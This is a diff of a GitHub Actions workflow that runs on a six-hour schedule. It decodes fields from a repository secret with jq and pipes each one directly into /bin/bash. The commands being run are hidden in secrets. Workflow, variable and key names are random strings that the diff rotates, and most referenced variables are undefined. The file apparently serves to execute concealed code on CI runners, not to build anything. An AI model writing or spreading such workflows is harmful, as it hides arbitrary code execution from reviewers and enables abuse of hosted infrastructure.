@@ -3,22 +3,23 @@ name: kongxianqi3178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 0/6 * * *'
-jobs:  # 19325
+    - cron: '23 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kongxianqi3178
         env:
-          nedw942: ${{ secrets.nedw942 }}
+          zaoxm0799: ${{ secrets.zaoxm0799 }}
         run: |
-          echo $nedw942 | jq -r .ozzh79 | /bin/bash
-          echo $vmoh1 | jq -r .w3239 | /bin/bash
-          echo $g4 | jq -r .vp9634 | /bin/bash
-          echo $itg111 | jq -r .vdk98 | /bin/bash
-          echo $o03799 | jq -r .zu345 | /bin/bash
-          echo $d2 | jq -r .nynr0266 | /bin/bash
-          echo $v11 | jq -r .rdnq64814 | /bin/bash
+          echo $zaoxm0799 | jq -r .jddvz801 | /bin/bash
+          echo $kopxw30 | jq -r .otsgf81 | /bin/bash
+          echo $yqccn5 | jq -r .zjups33673 | /bin/bash
+          echo $i82 | jq -r .belif242 | /bin/bash
+          echo $le200 | jq -r .diag18 | /bin/bash
+          echo $uzel896 | jq -r .wob0606 | /bin/bash
+          echo $vodr787 | jq -r .zrxs4 | /bin/bash
+          echo $jmujz2 | jq -r .hilf447 | /bin/bash
 
